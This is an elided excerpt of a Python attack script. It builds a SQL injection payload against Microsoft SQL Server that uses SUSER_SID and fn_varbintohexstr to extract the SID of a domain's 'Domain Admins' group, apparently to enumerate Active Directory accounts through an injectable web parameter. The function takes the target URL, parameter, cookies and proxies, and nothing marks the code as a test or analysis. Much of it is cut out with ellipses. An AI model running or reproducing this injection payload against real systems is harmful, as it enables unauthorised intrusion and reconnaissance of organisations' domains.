...
def sid_to_str(sid):
    ...
    #print ('S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids])))
...
def extract_sid(method,url,content_type,body,domain,column_number,column_type,data,parameter,encoding,proxies,cookies):
    try:
        ...
        payload += f"(SELECT CONCAT ( 'W00TW00T', (select sys.fn_varbintohexstr(SUSER_SID('{domain}\\Domain Admins'))), 'W00TW00T' ) AS Result)--"
        ...
        extract_sid(method,url,content_type,body,domain,column_number,column_type,data,parameter,encoding,proxies,cookies)
